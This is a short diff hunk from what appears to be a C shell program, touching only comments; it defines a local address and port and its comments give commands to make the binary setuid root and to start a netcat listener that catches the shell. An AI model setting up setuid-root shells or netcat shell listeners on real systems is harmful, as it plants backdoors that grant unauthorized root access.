@@ -8,8 +8,8 @@
 #define REMOTE_ADDR "127.0.0.1"
 #define REMOTE_PORT 12345
 // sudo chown root:root shell 
-//sudo chmod 4711 shell
-// nc -v -l 127.0.0.1 1234
+// sudo chmod 4711 shell
+// nc -v -l 127.0.0.1 12345 //to listen the socket
 
 
 int main(int argc, char *argv[])
